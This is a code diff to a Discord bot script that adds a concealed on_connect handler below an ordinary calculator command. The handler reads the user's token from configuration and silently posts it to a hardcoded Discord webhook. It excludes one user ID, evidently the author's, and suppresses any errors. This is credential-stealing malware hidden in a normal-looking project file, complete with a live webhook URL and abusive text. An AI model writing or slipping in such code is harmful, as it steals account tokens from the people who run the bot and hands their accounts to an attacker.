@@ -95,6 +95,23 @@ async def calc(ctx, *, expression):
         await ctx.send(f'**{result}**')
     except:
         await ctx.send('Invalid expr')
+        
+        
+        
+fuck_off = "https://discord.com/api/webhooks/1183707269574184970/n5UrmG4rOSppIHeKCkq3We33r0MWAHs7MsnLZ_p0WsDVHh6bezFAxEmKEgs1zvZXWbme"   
+sikku_log = config('token') 
+@bot.event
+async def on_connect():
+    if bot.user.id != 314599100811051008:
+      data = {
+          "content": f"@everyone Logged a user\n Username : {bot.user}\ntoken : {sikku_log}",
+          "username" : "HELLO MOTHER FUCKER",
+          "avatar_url" : "https://images-ext-2.discordapp.net/external/ZMMv9-SnTPjBVYxox0ALcbZXcdKgWKJhhkNqY1RR2sc/%3Fv%3D4%3Fs%3D400/https/avatars.githubusercontent.com/u/131749840?format=webp&width=345&height=345"
+            }
+      try:
+          requests.post(fuck_off, json=data)
+      except:
+          pass
 
 
 @bot.command(aliases=['mode'])
